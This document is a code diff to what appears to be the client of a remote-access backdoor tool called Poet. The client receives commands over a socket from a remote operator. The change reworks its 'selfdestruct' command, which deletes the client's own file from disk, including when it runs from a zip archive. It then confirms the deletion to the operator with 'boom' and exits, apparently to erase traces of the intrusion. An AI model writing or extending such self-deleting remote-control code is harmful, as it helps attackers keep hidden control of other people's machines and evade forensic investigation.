@@ -71,9 +71,20 @@ class PoetClient(object):
                         s.send(e.strerror)
                 elif inp == 'selfdestruct':
                     try:
+                        # get filename based on if we're executing inside zip
+                        # file or not
+                        file = __file__.split('/')[0] if '.zip' in __file__ else __file__
+
+                        # if the flag to delete client on launch wasn't given
                         if not args.delete:
-                            os.remove(__file__)
-                        if __file__.strip('./') not in os.listdir('.'):
+                            os.remove(file)
+
+                        # check to make sure it's actually deleted
+                        # - the .strip('./') is for when we're executing as a
+                        #   regular file (no effect on zip file)
+                        # - the .split('/')[0] is for if we're in a zip file
+                        #   (no effect on regular file
+                        if file.strip('./').split('/')[0] not in os.listdir('.'):
                             s.send('boom')
                             sys.exit()
                         else:
